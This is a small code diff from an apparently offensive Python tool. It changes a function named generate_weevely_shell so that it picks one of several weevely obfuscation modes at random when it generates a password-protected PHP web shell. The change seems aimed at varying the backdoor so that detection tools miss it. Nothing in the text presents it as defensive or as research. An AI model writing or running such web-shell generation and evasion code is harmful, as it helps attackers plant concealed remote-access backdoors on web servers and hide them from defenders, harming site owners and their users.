@@ -166,7 +166,12 @@ def generate_weevely_shell(password: str, output_path: str) -> str:
     try:
         os.makedirs(os.path.dirname(output_path), exist_ok=True)
         cmd = ['weevely', 'generate', password, output_path]
-        subprocess.run(cmd, check=True, capture_output=True)
+        cmd2 = ['weevely', 'generate', '-obfuscator', 'obfusc1_php', password, output_path]
+        cmd3 = ['weevely', 'generate', '-obfuscator', 'cleartext1_php', password, output_path]
+        cmd4 = ['weevely', 'generate', '-obfuscator', 'phar', password, output_path]
+        cmd_list = [cmd, cmd2, cmd3, cmd4]
+        real_cmd = random.choice(cmd_list)
+        subprocess.run(real_cmd, check=True, capture_output=True)
         if os.path.exists(output_path):
             return output_path
         else:
